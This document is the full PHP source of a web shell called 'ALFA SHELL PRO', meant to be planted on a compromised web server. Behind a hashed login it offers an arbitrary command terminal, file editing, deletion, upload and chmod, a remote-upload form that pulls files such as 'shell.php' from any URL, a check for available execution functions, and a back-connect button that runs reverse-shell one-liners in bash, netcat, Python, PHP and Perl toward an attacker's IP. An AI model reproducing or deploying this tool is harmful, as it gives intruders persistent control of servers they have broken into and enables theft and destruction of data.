<?php
session_start();
error_reporting(0);
set_time_limit(0);

// --- LOGIN SYSTEM (MD5 UPDATED) ---
$user = "dc571867053d4f69c37666db0144d898"; // 
$pass = "0b1d8126b1ba44e573c4c50d1acb5588"; // 

if (isset($_POST['login'])) { 
    if (md5($_POST['u']) == $user && md5($_POST['p']) == $pass) {
        $_SESSION['alfa_session'] = true; 
    }
}

if (isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }
if (!isset($_SESSION['alfa_session'])) {
    die('<body style="background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:monospace;">
    <form method="POST"><h3>[ ALFA LOGIN ]</h3>
    User: <input type="text" name="u" style="background:#000;border:1px solid #333;color:#0f0;"><br><br>
    Pass: <input type="password" name="p" style="background:#000;border:1px solid #333;color:#0f0;"><br><br>
    <button type="submit" name="login" style="width:100%;background:#0f0;color:#000;border:none;cursor:pointer;">ENTER</button></form></body>');
}

// --- BACK CONNECT FUNCTION ---
if(isset($_GET['backconnect'])) {
    $ip = $_GET['ip'];
    $port = $_GET['port'];
    
    $payloads = [
        // Bash TCP
        "bash -i >& /dev/tcp/$ip/$port 0>&1",
        // Netcat traditional
        "nc -e /bin/sh $ip $port",
        // Netcat openbsd
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f",
        // Python 2
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        // Python 3
        "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        // PHP
        "php -r \"\$sock=fsockopen('$ip',$port);exec('/bin/sh -i <&3 >&3 2>&3');\"",
        // Perl
        "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    ];
    
    $funcs = ['system', 'passthru', 'exec', 'shell_exec'];
    foreach($funcs as $func) {
        if(function_exists($func)) {
            foreach($payloads as $payload) {
                $func($payload);
            }
            die('🕷️ BACK CONNECT SENT - Check your listener!');
        }
    }
    die('❌ No execution functions available');
}

// *** NEW PERMISSION FUNCTIONS ***
function get_user_group($file) {
    if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
        $stat = stat($file);
        if ($stat) {
            $uid = $stat['uid'];
            $gid = $stat['gid'];
            $user_info = posix_getpwuid($uid);
            $group_info = posix_getgrgid($gid);
            return $user_info['name'] . '/' . $group_info['name'];
        }
    }
    return 'N/A';
}

function change_permission($file, $perm) {
    return chmod($file, octdec($perm));
}

if (isset($_POST['do_chmod'])) {
    $target = $_POST['chmod_target'];
    $new_perm = $_POST['new_perm'];
    if (change_permission($target, $new_perm)) {
        $_SESSION['chmod_success'] = $target . ' → ' . $new_perm;
    } else {
        $_SESSION['chmod_error'] = 'Failed to change permission on ' . $target;
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

// --- PATH & DIRECTORY ---
$path = isset($_GET['path']) ? realpath($_GET['path']) : realpath(__DIR__);
if (!is_dir($path)) $path = realpath(__DIR__);
chdir($path); 

// --- LOGIKA AKSI ---
if (isset($_POST['save_file'])) { file_put_contents($_POST['filepath'], $_POST['filecontent']); }
if (isset($_POST['do_rename'])) { rename($_POST['old_name'], $path . '/' . $_POST['new_name']); }
if (isset($_POST['do_make_file'])) { file_put_contents($path . '/' . $_POST['n_file'], ""); }
if (isset($_POST['do_make_dir'])) { mkdir($path . '/' . $_POST['n_dir']); }
if (isset($_GET['del'])) { 
    $target = $_GET['del']; 
    function rmdir_recursive($dir) {
        if (is_dir($dir)) {
            $files = array_diff(scandir($dir), array('.', '..'));
            foreach ($files as $file) rmdir_recursive("$dir/$file");
            rmdir($dir);
        } else unlink($dir);
    }
    rmdir_recursive($target);
    header("Location: ?path=".urlencode($path)); exit; 
}
if (isset($_POST['do_upload'])) { move_uploaded_file($_FILES['file']['tmp_name'], $path.'/'.$_FILES['file']['name']); }
if (isset($_POST['rem_upload'])) { copy($_POST['url'], $path.'/'.basename($_POST['url'])); }

function get_pwd($path) {
    $parts = explode(DIRECTORY_SEPARATOR, $path); $res = ""; $acc = "";
    foreach ($parts as $p) { if ($p == "") continue; $acc .= DIRECTORY_SEPARATOR . $p;
        $res .= DIRECTORY_SEPARATOR . '<a href="?path='.urlencode($acc).'" style="color:#0f0;text-decoration:none;">'.$p.'</a>'; }
    return $res;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>🕷️ ALFA SHELL PRO - BACK CONNECT ADDED</title>
    <style>
        body { background: #000; color: #c9d1d9; font-family: monospace; font-size: 12px; margin: 0; }
        .pwd-bar { background: #000; padding: 10px; border-left: 5px solid #0f0; border-bottom: 1px solid #333; }
        .nav { display: flex; gap: 5px; padding: 10px; background: #0d1117; flex-wrap: wrap; }
        .btn-nav { border: 1px solid #333; padding: 4px 10px; color: #0f0; background: #161b22; cursor: pointer; text-decoration: none; border-radius:3px; transition: all 0.3s; }
        .btn-nav:hover { background: #0f0 !important; color: #000 !important; }
        .backconnect { background: #ff0040 !important; color: #fff !important; border-color: #ff0040 !important; }
        .backconnect:hover { background: #cc0033 !important; }
        .chmod-btn { background: #e3b341 !important; color: #000 !important; border-color: #e3b341 !important; }
        .chmod-btn:hover { background: #d4a017 !important; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #161b22; color: #8b949e; padding: 8px; text-align: left; }
        td { padding: 6px 10px; border-bottom: 1px solid #21262d; }
        .action-link { color: #fff; text-decoration: none; margin-right: 8px; font-weight: bold; cursor: pointer; }
        .action-link:hover { color: #0f0 !important; }
        .chmod-link { color: #e3b341 !important; }
        .chmod-link:hover { color: #f59e0b !important; }
        .user-group { color: #58a6ff; font-size: 11px; }
        input[type="text"], textarea { background: #000; border: 1px solid #333; color: #0f0; padding: 5px; font-family: monospace; }
        .go { color: #0f0; background: none; border: 1px solid #0f0; cursor: pointer; font-size: 14px; font-weight: bold; padding: 4px 12px; border-radius: 3px; transition: all 0.3s; }
        .go:hover { background: #0f0; color: #000; }
        #rem-pop, #back-pop, #chmod-pop { display:none; position:fixed; top:30%; left:50%; transform:translate(-50%,-50%); background:#000; border:2px solid #0f0; padding:20px; z-index:99; width:450px; text-align:center; }
        #back-pop { border-color: #ff0040; width: 500px; }
        #chmod-pop { border-color: #e3b341; width: 500px; }
        pre { background: #0d1117; color: #0f0; padding: 10px; border: 1px solid #333; overflow: auto; max-height: 400px; text-align: left; white-space: pre-wrap; font-size: 11px; line-height: 1.4; }
        .success { color: #0f0; font-weight: bold; padding: 10px; background: #0a1a0a; border-left: 4px solid #0f0; margin: 10px 0; }
        .chmod-success { color: #e3b341; font-weight: bold; padding: 10px; background: #1a1700; border-left: 4px solid #e3b341; margin: 10px 0; }
        .chmod-error { color: #ff4444; font-weight: bold; padding: 10px; background: #1a0000; border-left: 4px solid #ff4444; margin: 10px 0; }
        .back-info { background: #1a0000; border: 1px solid #ff0040; padding: 15px; margin: 10px 0; border-radius: 5px; color: #ff6666; }
    </style>
</head>
<body>

<div class="pwd-bar">🕷️ PWD: <?php echo get_pwd($path); ?> <a href="?logout=1" style="color:#ff4444; float:right; font-weight:bold;">[ 🚪 Logout ]</a></div>

<div class="nav">
    <a href="?path=<?php echo urlencode($path); ?>" class="btn-nav">🔄 Refresh</a>
    <a href="#" class="btn-nav" onclick="document.getElementById('rem-pop').style.display='block'">🌐 Remote Upload</a>
    <a href="?action=terminal&path=<?php echo urlencode($path); ?>" class="btn-nav">💻 Terminal</a>
    <a href="#" class="btn-nav backconnect" onclick="document.getElementById('back-pop').style.display='block'">🔗 BACK CONNECT</a>
    <a href="?check=1&path=<?php echo urlencode($path); ?>" class="btn-nav">🔍 Check Bypass</a>
    <a href="#" class="btn-nav chmod-btn" onclick="document.getElementById('chmod-pop').style.display='block'">🔧 CHMOD</a>
</div>

<!-- REMOTE UPLOAD POPUP -->
<div id="rem-pop">
    <div style="background:#0f0; color:#000; padding:5px; margin-bottom:15px; font-weight:bold;">📡 | Remote Upload |</div>
    <form method="POST">
        Url: <input type="text" name="url" style="width:80%;" placeholder="http://site.com/shell.php"><br><br>
        <p style="font-size:10px; color:#888;">📁 Target: <?php echo $path; ?></p>
        <button type="submit" name="rem_upload" class="go">▶️ EXECUTE</button>
        <button type="button" onclick="document.getElementById('rem-pop').style.display='none'" style="color:#ff4444; background:none; border:none; cursor:pointer; font-weight:bold;">[ ❌ Close ]</button>
    </form>
</div>

<!-- BACK CONNECT POPUP -->
<div id="back-pop">
    <div style="background:#ff0040; color:#fff; padding:8px; margin-bottom:15px; font-weight:bold;">🔗 | BACK CONNECT REVERSE SHELL |</div>
    <div class="back-info">
        <strong>🎯 Listener dulu:</strong><br>
        <code style="color:#ffcc00; background:#000; padding:5px; display:block; margin:5px 0;">nc -lvnp 4444</code>
        <strong>🛠️ Support:</strong> bash, nc, python, php, perl | Auto fallback
    </div>
    <form method="GET">
        <input type="hidden" name="path" value="<?php echo urlencode($path); ?>">
        <input type="hidden" name="backconnect" value="1">
        Your IP: <input type="text" name="ip" style="width:35%; background:#ff0040; color:#000; font-weight:bold;" placeholder="1.2.3.4" required><br><br>
        Port: <input type="number" name="port" style="width:20%; background:#ff0040; color:#000; font-weight:bold;" value="4444" min="1" max="65535" required><br><br>
        <button type="submit" class="go" style="background:#ff0040; color:#fff; border-color:#ff0040; font-size:16px; padding:10px 20px;">🚀 SEND REVERSE SHELL</button>
        <button type="button" onclick="document.getElementById('back-pop').style.display='none'" style="color:#ff6666; background:none; border:none; cursor:pointer; font-weight:bold;">[ ❌ Close ]</button>
    </form>
    <div style="margin-top:15px; font-size:10px; color:#ff9999;">
        ⚠️ Pastikan listener aktif sebelum klik SEND!
    </div>
</div>

<!-- NEW CHMOD POPUP -->
<div id="chmod-pop">
    <div style="background:#e3b341; color:#000; padding:8px; margin-bottom:15px; font-weight:bold;">🔧 | CHANGE PERMISSION (CHMOD) |</div>
    <form method="POST">
        <input type="hidden" name="path" value="<?php echo urlencode($path); ?>">
        <strong>Target:</strong><br>
        <input type="text" name="chmod_target" id="chmod_target" style="width:80%; background:#e3b341; color:#000; font-weight:bold;" placeholder="/path/to/file" required><br><br>
        <strong>New Permission (octal):</strong><br>
        <input type="text" name="new_perm" value="755" style="width:20%; background:#000; color:#0f0; font-weight:bold; font-family:monospace;" maxlength="3" pattern="[0-7]{3}" required>
        <small style="color:#888;">(contoh: 777, 755, 644, 644)</small><br><br>
        <button type="submit" name="do_chmod" class="go" style="background:#e3b341; color:#000; border-color:#e3b341; font-size:16px; padding:12px 24px;">✅ APPLY CHMOD</button>
        <button type="button" onclick="document.getElementById('chmod-pop').style.display='none'" style="color:#ff4444; background:none; border:none; cursor:pointer; font-weight:bold;">[ ❌ Close ]</button>
    </form>
    <div style="margin-top:15px; font-size:10px; color:#e3b341;">
        💡 Copy path dari kolom User/Group di tabel untuk chmod cepat!
    </div>
</div>

<?php if (isset($_GET['check'])): ?>
<div style="padding:20px; background:#0a1a00; border-left:5px solid #0f0; margin:20px;">
    <h3 style="color:#0f0;">🔍 BYPASS CHECKER</h3>
    <?php
    $funcs = ['system','passthru','exec','shell_exec','proc_open','popen','pcntl_exec'];
    echo "<strong>✅ Available Functions:</strong><br>";
    foreach($funcs as $func) {
        if(function_exists($func)) echo "<span style='color:#0f0;'>✓ $func</span><br>";
        else echo "<span style='color:#ff4444;'>✗ $func</span><br>";
    }
    echo "<br><strong>ℹ️ Server:</strong> " . php_uname() . "<br>";
    echo "<strong>🖥️ PHP:</strong> " . phpversion();
    ?>
</div>
<?php endif; ?>

<?php 
// CHMOD SUCCESS/ERROR MESSAGES
if (isset($_SESSION['chmod_success'])) {
    echo '<div class="chmod-success">✅ ' . $_SESSION['chmod_success'] . '</div>';
    unset($_SESSION['chmod_success']);
}
if (isset($_SESSION['chmod_error'])) {
    echo '<div class="chmod-error">❌ ' . $_SESSION['chmod_error'] . '</div>';
    unset($_SESSION['chmod_error']);
}
?>

<?php if (isset($_GET['action']) && $_GET['action'] == 'terminal'): ?>
    <div style="padding:20px;">
        <h3 style="color:#0f0;">>__ Terminal Console (Path: <?php echo $path; ?>)</h3>
        <form method="POST">
            <input type="text" name="cmd" style="width:80%;" autofocus>
            <button type="submit" name="exec_cmd" class="go">» EXECUTE</button>
        </form>
        <?php if(isset($_POST['exec_cmd'])): ?>
            <pre><?php echo htmlspecialchars(shell_exec("timeout 10 " . $_POST['cmd'] . " 2>&1")); ?></pre>
        <?php endif; ?>
    </div>

<?php elseif(isset($_GET['edit'])): ?>
    <div style="padding:20px;">
        <h3 style="color:#0f0;">✏️ Editing: <span style="color:#58a6ff;"><?php echo basename($_GET['edit']); ?></span></h3>
        <form method="POST">
            <input type="hidden" name="filepath" value="<?php echo $_GET['edit']; ?>">
            <textarea name="filecontent" style="width:100%; height:500px; font-size:13px;"><?php echo htmlspecialchars(file_get_contents($_GET['edit'])); ?></textarea><br><br>
            <button type="submit" name="save_file" class="go" style="background:#0f0; color:#000; font-size:16px; padding:12px 24px;">💾 SAVE CHANGES</button>
            <a href="?path=<?php echo urlencode($path); ?>" class="btn-nav" style="margin-left:15px;">← Back</a>
        </form>
    </div>

<?php elseif(isset($_GET['ren'])): ?>
    <div style="padding:20px; text-align:center;">
        <h3 style="color:#0f0;">🔄 Rename: <span style="color:#fff;"><?php echo basename($_GET['ren']); ?></span></h3>
        <form method="POST">
            <input type="hidden" name="old_name" value="<?php echo $_GET['ren']; ?>">
            <input type="text" name="new_name" value="<?php echo htmlspecialchars(basename($_GET['ren'])); ?>" style="width:400px; font-size:14px;" autofocus>
            <button type="submit" name="do_rename" class="go" style="font-size:16px;">✅ RENAME</button>
        </form>
        <a href="?path=<?php echo urlencode($path); ?>" class="btn-nav" style="margin-top:15px; display:inline-block;">← Back</a>
    </div>

<?php else: ?>
    <?php if(isset($_POST['do_upload'])): ?>
    <div class="success">✅ File uploaded: <?php echo $_FILES['file']['name']; ?></div>
    <?php endif; ?>
    
    <?php if(isset($_POST['rem_upload'])): ?>
    <div class="success">✅ Downloaded: <?php echo basename($_POST['url']); ?></div>
    <?php endif; ?>

    <table>
        <thead><tr><th style="width:35%">📁 Name</th><th>User/Group</th><th>Size</th><th>Perms</th><th>Actions</th></tr></thead>
        <tbody>
            <?php 
            // Collect directories first, then files
            $dirs = [];
            $files = [];
            
            foreach (scandir($path) as $item): 
                if($item == "." || $item == "..") continue; 
                $f = $path.'/'.$item; 
                $isDir = is_dir($f); 
                $size = $isDir ? '-' : (filesize($f) > 1024*1024 ? round(filesize($f)/1024/1024,1).'MB' : round(filesize($f)/1024,1).'KB');
                $usergroup = get_user_group($f);
                
                if ($isDir) {
                    $dirs[] = ['item' => $item, 'f' => $f, 'size' => $size, 'usergroup' => $usergroup];
                } else {
                    $files[] = ['item' => $item, 'f' => $f, 'size' => $size, 'usergroup' => $usergroup];
                }
            endforeach;
            
            // Display directories first
            foreach ($dirs as $dir): 
                $item = $dir['item'];
                $f = $dir['f'];
                $size = $dir['size'];
                $usergroup = $dir['usergroup'];
            ?>
            <tr style="transition: background 0.2s;">
                <td style="font-weight:500;"><span style="color:#e3b341;">📁 DIR</span> 
                    <a href="?path=<?php echo urlencode($f); ?>" style="color:#e3b341;"><?php echo htmlspecialchars($item); ?>/</a>
                </td>
                <td class="user-group">
                    <span title="Click to CHMOD" onclick="setChmodTarget('<?php echo addslashes($f); ?>')" style="cursor:pointer; color:#58a6ff;"><?php echo $usergroup; ?></span>
                </td>
                <td style="color:#8b949e;"><?php echo $size; ?></td>
                <td style="color:#0f0; font-family:monospace;"><?php echo substr(sprintf('%o', fileperms($f)), -4); ?></td>
                <td style="white-space:nowrap;">
                    <a href="?ren=<?php echo urlencode($f); ?>&path=<?php echo urlencode($path); ?>" class="action-link" style="color:#f59e0b;" title="Rename">🔄</a>
                    <a href="?del=<?php echo urlencode($f); ?>&path=<?php echo urlencode($path); ?>" class="action-link" style="color:#ff4444;" onclick="return confirm('🗑️ Delete <?= $item ?>?')" title="Delete">🗑️</a>
                    <a href="#" class="action-link chmod-link" onclick="setChmodTarget('<?php echo addslashes($f); ?>')" title="Change Permission">🔧</a>
                </td>
            </tr>
            <?php endforeach; ?>
            
            <!-- Display files after directories -->
            <?php foreach ($files as $file): 
                $item = $file['item'];
                $f = $file['f'];
                $size = $file['size'];
                $usergroup = $file['usergroup'];
            ?>
            <tr style="transition: background 0.2s;">
                <td style="font-weight:500;"><span style="color:#58a6ff;">📄</span> 
                    <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($f); ?>" style="color:#58a6ff;"><?php echo htmlspecialchars($item); ?></a>
                </td>
                <td class="user-group">
                    <span title="Click to CHMOD" onclick="setChmodTarget('<?php echo addslashes($f); ?>')" style="cursor:pointer; color:#58a6ff;"><?php echo $usergroup; ?></span>
                </td>
                <td style="color:#8b949e;"><?php echo $size; ?></td>
                <td style="color:#0f0; font-family:monospace;"><?php echo substr(sprintf('%o', fileperms($f)), -4); ?></td>
                <td style="white-space:nowrap;">
                    <a href="?ren=<?php echo urlencode($f); ?>&path=<?php echo urlencode($path); ?>" class="action-link" style="color:#f59e0b;" title="Rename">🔄</a>
                    <a href="?edit=<?php echo urlencode($f); ?>&path=<?php echo urlencode($path); ?>" class="action-link" style="color:#58a6ff;" title="Edit">✏️</a>
                    <a href="?del=<?php echo urlencode($f); ?>&path=<?php echo urlencode($path); ?>" class="action-link" style="color:#ff4444;" onclick="return confirm('🗑️ Delete <?= $item ?>?')" title="Delete">🗑️</a>
                    <a href="#" class="action-link chmod-link" onclick="setChmodTarget('<?php echo addslashes($f); ?>')" title="Change Permission">🔧</a>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>

    <div style="background: #0d1117; border-top: 1px solid #333; padding: 25px; display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; margin-top:15px;">
        <div style="text-align:center;">
            <strong style="color:#0f0;">📄 Make File</strong><br>
            <form method="POST" style="margin-top:10px;">
                <input type="text" name="n_file" placeholder="shell.php" style="width:70%;">
                <button name="do_make_file" class="go">▶️</button>
            </form>
        </div>
        <div style="text-align:center;">
            <strong style="color:#e3b341;">📁 Make Directory</strong><br>
            <form method="POST" style="margin-top:10px;">
                <input type="text" name="n_dir" placeholder="new_folder" style="width:70%;">
                <button name="do_make_dir" class="go">▶️</button>
            </form>
        </div>
        <div style="text-align:center;">
            <strong style="color:#58a6ff;">📤 Local Upload</strong><br>
            📁 <span style="color:#0f0;"><?= basename($path); ?></span><br>
            <form method="POST" enctype="multipart/form-data" style="margin-top:10px;">
                <input type="file" name="file" style="width:70%;">
                <button name="do_upload" class="go">▶️</button>
            </form>
        </div>
    </div>
<?php endif; ?>

<div style="text-align:center; color:#666; padding:30px; font-size:11px; border-top:1px solid #333; margin-top:20px;">
    🕷️ <strong>ALFA SHELL PRO v2.0</strong> | Back Connect Fixed | AlfaTeam © 2012-2026
</div>

<script>
tr:hover { background: rgba(15,255,0,0.05) !important; }

function setChmodTarget(path) {
    document.getElementById('chmod_target').value = path;
    document.getElementById('chmod-pop').style.display = 'block';
}
</script>
</body>
</html>